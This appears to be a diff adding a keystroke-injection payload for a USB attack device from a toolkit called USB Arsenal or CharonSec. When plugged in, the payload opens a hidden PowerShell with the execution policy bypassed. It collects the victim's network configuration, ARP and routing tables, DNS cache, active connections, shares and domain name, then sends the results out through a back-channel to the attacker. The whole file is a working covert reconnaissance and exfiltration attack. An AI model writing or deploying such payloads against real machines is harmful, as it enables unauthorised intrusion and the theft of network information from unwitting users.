@@ -1,0 +1,18 @@
+REM ============================================================
+REM  Windows · Network Reconnaissance
+REM ============================================================
+REM  Collects network config, ARP table, routing table, DNS
+REM  cache, active connections, shares, and domain info.
+REM  Returns results via back-channel to CharonSec.
+REM
+REM  Requires USB Arsenal back-channel profile.
+
+DEFAULTDELAY 60
+
+GUI r
+DELAY 700
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1500
+
+WINHI 15000 @{IP=ipconfig|Out-String;ARP=arp -a|Out-String;Routes=route print|Out-String;DNS=(Get-DnsClientCache|Select Entry,Data|Out-String);Connections=netstat -an|Out-String;Shares=net share|Out-String;Domain=$env:USERDNSDOMAIN} | ConvertTo-Json -Compress
